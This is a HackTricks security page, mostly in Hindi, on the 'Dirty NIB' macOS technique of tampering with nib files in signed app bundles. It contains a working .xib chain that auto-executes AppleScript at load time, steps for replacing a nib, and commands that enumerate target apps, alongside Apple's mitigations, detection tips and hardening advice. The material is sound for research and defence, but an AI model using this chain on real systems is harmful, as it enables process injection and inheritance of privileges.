# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB का अर्थ है signed macOS app bundle के अंदर मौजूद Interface Builder files (.xib/.nib) का दुरुपयोग करके target process के अंदर attacker-controlled logic execute करना, जिससे उसे target process के entitlements और TCC permissions विरासत में मिलते हैं। इस technique को मूल रूप से xpn (MDSec) ने document किया था और बाद में Sector7 ने इसे generalized तथा काफी विस्तृत किया। Sector7 ने macOS 13 Ventura और macOS 14 Sonoma में Apple द्वारा लागू किए गए mitigations को भी कवर किया।<sup>[1][2]</sup> पृष्ठभूमि और विस्तृत जानकारी के लिए अंत में दिए गए references देखें।

> TL;DR
> • macOS 13 Ventura से पहले: किसी bundle के MainMenu.nib (या startup पर लोड होने वाले किसी अन्य nib) को बदलकर process injection और अक्सर privilege escalation को विश्वसनीय रूप से हासिल किया जा सकता था।
> • macOS 13 (Ventura) के बाद और macOS 14 (Sonoma) में बेहतर किए जाने के साथ: first-launch deep verification, bundle protection, Launch Constraints और नई TCC “App Management” permission, unrelated apps द्वारा post-launch nib tampering को काफी हद तक रोकते हैं। फिर भी niche cases में attacks संभव हो सकते हैं (जैसे same-developer tooling द्वारा अपने apps में बदलाव करना, या user द्वारा App Management/Full Disk Access दिए गए terminals)।

## NIB/XIB files क्या हैं

Nib (NeXT Interface Builder का संक्षिप्त रूप) serialized UI object graphs हैं, जिनका उपयोग AppKit apps करती हैं। Modern Xcode editable XML .xib files को store करता है, जिन्हें build time पर .nib में compile किया जाता है। एक सामान्य app `NSApplicationMain()` के माध्यम से अपना main UI load करती है, जो app की Info.plist से `NSMainNibFile` key पढ़कर runtime पर object graph को instantiate करता है।

Attack को संभव बनाने वाले मुख्य बिंदु:
- NIB loading arbitrary Objective-C classes को instantiate करता है और उनके लिए NSSecureCoding के अनुरूप होना आवश्यक नहीं है (जब `initWithCoder:` उपलब्ध नहीं होता, तो Apple का nib loader `init`/`initWithFrame:` पर fallback करता है)।
- Cocoa Bindings का दुरुपयोग करके nibs के instantiate होते समय methods को call किया जा सकता है, जिसमें chained calls भी शामिल हैं और user interaction की आवश्यकता नहीं होती।


## Dirty NIB injection process (attacker view)

Classic pre-Ventura flow:
1) एक malicious .xib बनाएं
- एक `NSAppleScript` object (या अन्य “gadget” classes जैसे `NSTask`) जोड़ें।
- एक `NSTextField` जोड़ें, जिसके title में payload हो (जैसे AppleScript या command arguments)।
- एक या अधिक `NSMenuItem` objects जोड़ें और bindings के माध्यम से उन्हें target object पर methods call करने के लिए wire करें।

2) User clicks के बिना auto-trigger
- किसी menu item के target/selector को set करने के लिए bindings का उपयोग करें और फिर private `_corePerformAction` method को invoke करें, ताकि nib load होते ही action अपने-आप fire हो जाए। इससे user द्वारा button पर click करने की आवश्यकता समाप्त हो जाती है।

एक .xib के अंदर auto-trigger chain का minimal example (clarity के लिए abridged):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
यह target process में nib load होने पर arbitrary AppleScript execution सक्षम करता है।<sup>[1]</sup> Advanced chains ये कर सकती हैं:
- Arbitrary AppKit classes (जैसे, `NSTask`) को instantiate करना और zero-argument methods जैसे `-launch` को call करना।
- ऊपर दिए गए binding trick के ज़रिए object arguments के साथ arbitrary selectors को call करना।
- Objective-C में bridge करने और selected C APIs को call करने के लिए AppleScriptObjC.framework को load करना।
- पुराने systems पर, जिनमें अभी भी Python.framework शामिल है, Python में bridge करना और फिर arbitrary C functions को call करने के लिए `ctypes` का उपयोग करना (Sector7’s research)।<sup>[2]</sup>

3) App का nib replace करें
- target.app को writable location पर copy करें, उदाहरण के लिए `Contents/Resources/MainMenu.nib` को malicious nib से replace करें, और target.app चलाएँ। Pre-Ventura, one-time Gatekeeper assessment के बाद, subsequent launches केवल shallow signature checks करते थे, इसलिए non-executable resources (जैसे .nib) को दोबारा validate नहीं किया जाता था।

Visible test के लिए Example AppleScript payload:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple ने कई systemic mitigations पेश किए हैं, जो modern macOS में Dirty NIB की viability को काफी कम कर देते हैं:<sup>[2]</sup>
- First‑launch deep verification और bundle protection (macOS 13 Ventura)
- किसी भी app के first run पर (quarantined हो या नहीं), deep signature check सभी bundle resources को कवर करता है। इसके बाद bundle protected हो जाता है: केवल उसी developer के apps (या app द्वारा explicitly allowed apps) ही इसके contents को modify कर सकते हैं। किसी अन्य app को दूसरे app के bundle में write करने के लिए नए TCC “App Management” permission की आवश्यकता होती है।
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps को किसी अन्य स्थान पर copy करके launch नहीं किया जा सकता; इससे OS apps के लिए “copy to /tmp, patch, run” approach निष्क्रिय हो जाती है।
- Improvements in macOS 14 Sonoma
- Apple ने App Management को और मजबूत किया और Sector7 द्वारा बताए गए known bypasses (जैसे CVE‑2023‑40450) को fix किया। Python.framework को पहले ही (macOS 12.3) हटा दिया गया था, जिससे कुछ privilege-escalation chains टूट गईं।
- Gatekeeper/Quarantine changes
- Gatekeeper, provenance और assessment changes की विस्तृत discussion के लिए, जिन्होंने इस technique को प्रभावित किया, नीचे referenced page देखें।

> Practical implication
> • Ventura+ पर आम तौर पर आप किसी third‑party app के .nib को modify नहीं कर सकते, जब तक आपके process के पास App Management न हो या वह target के समान Team ID से signed न हो (जैसे developer tooling)।
> • Shells/terminals को App Management या Full Disk Access देने से, उस terminal के context के अंदर code execute कर सकने वाली किसी भी चीज़ के लिए यह attack surface effectively फिर से खुल जाता है।


### Addressing Launch Constraints

Ventura से शुरू होकर Launch Constraints कई Apple apps को non‑default locations से run होने से रोकते हैं। यदि आप pre‑Ventura workflows पर निर्भर थे, जैसे किसी Apple app को temporary directory में copy करना, `MainMenu.nib` को modify करना और उसे launch करना, तो >= 13.0 पर इसके fail होने की अपेक्षा रखें।


## Enumerating targets and nibs (useful for research / legacy systems)

- उन apps को locate करें जिनका UI nib‑driven है:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- bundle के अंदर candidate nib resources खोजें:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Code signatures को गहराई से validate करें (यदि आपने resources के साथ छेड़छाड़ की और उन्हें re-sign नहीं किया, तो यह fail होगा):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Note: आधुनिक macOS पर उचित authorization के बिना किसी अन्य app के bundle में लिखने का प्रयास करने पर आपको bundle protection/TCC द्वारा भी block कर दिया जाएगा।


## Detection और DFIR tips

- Bundle resources की file integrity monitoring
- Installed apps में `Contents/Resources/*.nib` और अन्य non‑executable resources के mtime/ctime changes पर नज़र रखें।
- Unified logs और process behavior
- GUI apps के अंदर unexpected AppleScript execution और AppleScriptObjC या Python.framework load करने वाली processes की निगरानी करें। उदाहरण:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Resources के intact रहने की पुष्टि करने के लिए critical apps पर समय-समय पर `codesign --verify --deep` चलाएँ।
- Privilege context
- Audit करें कि किन users/processes के पास TCC “App Management” या Full Disk Access है, विशेष रूप से terminals और management agents के पास। इन्हें general-purpose shells से हटाने पर Dirty NIB-शैली के tampering को आसानी से दोबारा enable करने से रोका जा सकता है।


## Defensive hardening (developers और defenders)

- Programmatic UI को प्राथमिकता दें या nibs से instantiate होने वाली चीज़ों को सीमित करें। NIB graphs में powerful classes (जैसे `NSTask`) शामिल करने से बचें और ऐसे bindings से बचें जो अप्रत्यक्ष रूप से arbitrary objects पर selectors invoke करते हैं।
- Library Validation के साथ hardened runtime अपनाएँ (यह modern apps के लिए पहले से standard है)। हालांकि यह अपने-आप nib injection को नहीं रोकता, लेकिन आसान native code loading को block करता है और attackers को scripting‑only payloads तक सीमित करता है।
- General-purpose tools में broad App Management permissions का request या उन पर dependency न रखें। यदि MDM के लिए App Management आवश्यक है, तो उस context को user-driven shells से अलग रखें।
- अपने app bundle की integrity को नियमित रूप से verify करें और अपने update mechanisms को bundle resources को self-heal करने योग्य बनाएँ।


## HackTricks में संबंधित reading

Gatekeeper, quarantine और provenance changes के बारे में अधिक जानें, जो इस technique को प्रभावित करते हैं:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
